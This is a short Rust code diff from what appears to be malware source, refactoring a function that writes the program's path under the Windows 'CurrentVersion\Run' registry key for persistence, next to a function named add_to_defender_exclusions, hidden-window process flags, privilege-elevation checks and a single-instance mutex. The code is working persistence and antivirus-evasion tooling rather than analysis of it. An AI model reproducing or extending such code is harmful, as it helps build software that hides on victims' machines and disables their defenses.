@@ -14,7 +14,6 @@ use winapi::um::securitybaseapi::GetTokenInformation;
 use winapi::um::synchapi::{OpenMutexW, CreateMutexW};
 use winapi::um::winbase::CREATE_NO_WINDOW;
 use winapi::um::winnt::{TokenElevation, HANDLE, TOKEN_ELEVATION, TOKEN_QUERY, SYNCHRONIZE};
-use winreg::{enums::*, RegKey};
 
 use crate::{FILE_NAME, MUTEX};
 
@@ -81,11 +80,12 @@ pub fn add_to_defender_exclusions(path: &str) -> () {
 }
 
 pub fn add_to_startup_registry(path: String) -> std::io::Result<()> {
-    let sub_key = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run";
+    use crate::registry;
 
-    let key = RegKey::predef(HKEY_CURRENT_USER).open_subkey_with_flags(sub_key, KEY_WRITE)?;
+    let key = registry::open_registry_key(r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run").unwrap();
+    registry::set_registry_value(key, FILE_NAME, &path)?;
 
-    key.set_value(FILE_NAME, &path)
+    Ok(())
 }
 
 pub fn check_mutex() -> bool {
